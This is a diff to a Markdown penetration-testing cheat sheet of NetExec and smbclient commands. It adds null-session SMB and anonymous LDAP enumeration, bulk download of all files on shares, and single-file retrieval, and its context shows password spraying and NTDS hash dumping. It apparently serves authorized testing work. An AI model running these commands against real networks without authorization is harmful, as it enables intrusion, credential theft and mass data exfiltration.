@@ -32,6 +32,14 @@ Common protocols include:
 - RDP
 - And sometimes more...
 
+## Null Session Enumeration
+
+Single command covers users, groups, shares, and password policy via null/anonymous session:
+
+```bash
+nxc smb <TARGET> -u '' -p '' --users --groups --shares --pass-pol
+```
+
 ## Password Policy Enumeration
 
 Enumerate password policy information via SMB:
@@ -73,16 +81,29 @@ nxc smb <TARGET> -u <USER> -p <PASSWORD> --groups "Domain Admins"
 # List available shares
 nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares
 
-# List all files
-nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" -M spider_plus --share "Departments Shares"
+# Index all files across all shares (no download -- outputs JSON file list)
+nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" -M spider_plus
 cat /tmp/nxc_spider_plus/*.json | python3 -m json.tool
+
+# Bulk download everything (filter out noisy default shares)
+nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus \
+    -o DOWNLOAD_FLAG=True \
+       OUTPUT_FOLDER=$HOME/nxc_spider \
+       MAX_FILE_SIZE=$((1024 * 1024 * 10)) \
+       EXCLUDE_FILTER='admin$,c$,ipc$,NETLOGON,SYSVOL'
+```
+
+### Download single file `smblcient`
+
+```bash
+smbclient //<TARGET>/<SHARE> -U '<USER>%<PASSWORD>' -c "get <FILE>"
 ```
 
 ## Password Spraying
 
 Password spraying uses one password against many users (alternates users), which has **no risk of account lockout** compared to brute-forcing. This is useful as a "hail Mary" to find any way in!
 
-**Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if you don't know the password policy, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.
+**Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if password policy is unknown, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.
 
 ```bash
 # Check nxc -h for services
@@ -160,6 +181,12 @@ nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> --ntds --ntds-history --ntds-pwdL
 ```
 
 ## LDAP Operations
+
+### Anonymous LDAP Search
+
+```bash
+nxc ldap <DC_IP> -u '' -p '' --users
+```
 
 ### Admin Count Enumeration
 
